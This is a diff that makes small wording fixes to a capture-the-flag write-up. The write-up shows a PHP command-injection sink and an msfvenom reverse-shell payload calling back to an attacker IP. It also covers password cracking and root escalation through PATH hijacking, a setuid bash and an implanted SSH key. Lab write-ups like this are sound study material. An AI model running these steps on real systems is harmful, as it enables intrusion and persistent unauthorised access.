@@ -80,7 +80,7 @@ $output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
 echo $output;
 
 $filepath = "/var/www/out.log";
-$filename = "out.log";    
+$filename = "out.log";
 ```
 
 so, looks like this above piece of code is where our entry point is, so lets try to confirm that if we have code execution on the remote server by pinging our self from the target machine and running a 
@@ -93,7 +93,7 @@ if you see any response on your machine like below, that mostly means we have co
 
 ![](../../.gitbook/assets/image%20%281%29.png)
 
-so, after confirming that we have code execution, I've run through couple of payloads to get a `reverse shell` using bash one-liner and `python` as well, but no luck, so I've used the generated payload from `msfvenom`
+so, after confirming that we have code execution, I've run through couple of payloads to get a `reverse shell` using bash one-liner and `python` as well, but no luck, so I've used the generated payload using `msfvenom`
 
 ```text
 msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=10.10.14.19 LPORT=4242 -f elf -o shell
@@ -113,7 +113,7 @@ not sure if we'll be able to crack this
 
 ![](../../.gitbook/assets/image%20%2812%29.png)
 
-there we go, we got it. let's see if we can crack this, meanwhile in `/var/backups` I found some `gz` files, lets have a look at that before we go into cracking \(not much in those `gz` files as well\)
+there we go, we got it. let's see if we can crack this, meanwhile in `/var/backups` I found some `gz` files, lets have a look at that before we go into cracking \(not much in those `gz` files\)
 
 so, we're able to crack the password using `hashcat`, \(it took quite some time, unusual for a CTF\)
 
@@ -133,6 +133,4 @@ export PATH=$HOME:$PATH
 once we do this and run the sudo command, `setuid` is turned ON on our `bash` executable, and we can simply run `/bin/bash -p` to get a root shell, and if you want an full ssh shell, you can put your `id_rsa.pub` into the `/root/.ssh/authorized_keys` and we can login using ssh
 
 ![](../../.gitbook/assets/screenshot-2021-08-13-at-23.44.01.png)
-
-
 
